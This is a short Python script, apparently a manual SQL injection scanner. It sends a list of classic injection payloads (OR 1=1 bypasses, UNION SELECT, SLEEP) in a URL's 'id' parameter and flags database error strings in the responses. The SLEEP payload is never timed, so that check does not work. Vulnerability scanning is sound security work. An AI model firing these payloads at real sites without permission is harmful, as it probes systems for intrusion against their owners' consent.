# manual_test.py
import requests

# Common SQL Injection payloads
payload_list = [
    "'",                     # Single quote
    "' OR 1=1 --",           # Classic bypass
    "' OR 'a'='a",           # Another bypass
    "1' OR '1'='1",          # Numeric bypass
    "' UNION SELECT NULL,NULL --",  # Union select
    "' AND SLEEP(5) --",     # Time-based blind
    "\" OR 1=1 --",          # Double quote bypass
    "' OR 'x'='x",           # Simple bypass
]

def manual_scan(target):
    """
    Perform a manual SQL Injection scan on the target URL.
    Returns (result, payloads_found)
    """

    vulnerable_payloads = []

    # Iterate over all payloads
    for payload in payload_list:
        try:
            # Inject payload in GET request parameter 'id' (common example)
            # This can be adjusted based on target structure
            if "?" in target:
                url = target + "&id=" + payload
            else:
                url = target + "?id=" + payload

            response = requests.get(url, timeout=5)

            # Simple detection: check for common SQL errors in response
            errors = [
                "You have an error in your SQL syntax",
                "Warning: mysql",
                "Unclosed quotation mark",
                "SQL syntax",
                "mysql_fetch",
                "mysqli_fetch",
                "ORA-01756",
                "syntax error"
            ]

            if any(e.lower() in response.text.lower() for e in errors):
                vulnerable_payloads.append(payload)

        except requests.exceptions.RequestException:
            # Skip payload if request fails (timeout, connection error, etc.)
            continue

    # Determine overall manual result
    if vulnerable_payloads:
        manual_result = "VULNERABLE"
    else:
        manual_result = "SAFE"

    return manual_result, vulnerable_payloads
